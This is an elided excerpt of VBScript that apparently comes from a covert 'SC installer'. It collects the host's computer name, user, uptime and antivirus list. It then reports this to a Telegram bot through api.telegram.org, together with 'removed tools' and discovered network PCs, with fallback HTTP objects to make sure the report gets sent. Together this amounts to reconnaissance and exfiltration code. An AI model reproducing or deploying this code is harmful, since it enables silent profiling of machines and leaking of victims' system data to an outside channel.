...
Sub GatherSystemInventory()
    ...
    ' Computer Name & User
    sInfo = sInfo & "Computer: " & oShell.ExpandEnvironmentStrings("%COMPUTERNAME%") & "%0A"
    ...
    For Each objOS In colOS
        ...
        sInfo = sInfo & "Uptime: " & nUptime & " hours%0A"
    Next
    ...
    sInfo = sInfo & "Antivirus: " & sAVList & "%0A"
...
Sub SendTelegramReport(sStatus, sExtraInfo)
    ...
    Dim sMessage
    sMessage = "SC INSTALLER REPORT%0A%0A"
    sMessage = sMessage & "STATUS: " & sStatus & "%0A"
    sMessage = sMessage & "Time: " & FormatDateTime(Now, 0) & "%0A%0A"
    ...
    sMessage = sMessage & "Removed: " & g_RemovedTools & "%0A"
    
    If g_NetworkPCs <> "" Then
        sMessage = sMessage & "Network PCs: " & g_NetworkPCs & "%0A"
    End If
    
    If sExtraInfo <> "" Then
        sMessage = sMessage & "%0A" & sExtraInfo & "%0A"
    End If
    
    ' Truncate if too long (Telegram limit: 4096 characters)
    If Len(sMessage) > 4000 Then
        sMessage = Left(sMessage, 4000) & "...%0A(Message truncated)"
    End If
    
    LogMessage "[TELEGRAM] Sending report..."
    
    ' Build URL with proper encoding (no parse_mode to avoid conflicts)
    Dim sURL
    sURL = "https://api.telegram.org/bot" & sBotToken & "/sendMessage" & _
           "?chat_id=" & sChatID & _
           "&text=" & URLEncode(sMessage)
    
    ' Try multiple HTTP objects with fallback
    Dim oHTTP
    Set oHTTP = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    If Err.Number <> 0 Then
        Err.Clear
    ...
    If Err.Number <> 0 Then
        LogMessage "[TELEGRAM] No HTTP object available. Cannot send report."
        Exit Sub
    End If
    ...
    If Err.Number <> 0 Then
        LogMessage "[TELEGRAM] HTTP Error: " & Err.Description
        Exit Sub
    End If
    
    If oHTTP.Status = 200 Then
        LogMessage "[TELEGRAM] Report sent successfully! Response: " & oHTTP.ResponseText
    Else
        LogMessage "[TELEGRAM] Failed to send. HTTP Status: " & oHTTP.Status & _
